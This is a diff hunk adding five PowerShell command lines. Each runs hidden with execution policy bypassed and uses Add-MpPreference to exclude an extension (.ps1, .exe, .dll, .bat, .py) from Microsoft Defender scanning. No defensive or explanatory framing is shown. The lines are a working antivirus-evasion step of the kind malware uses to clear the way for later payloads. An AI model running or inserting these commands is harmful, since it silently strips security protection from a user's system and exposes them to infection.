@@ -1,0 +1,5 @@
+powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionExtension '.ps1'"
+powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionExtension '.exe'"
+powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionExtension '.dll'"
+powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionExtension '.bat'"
+powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionExtension '.py'"
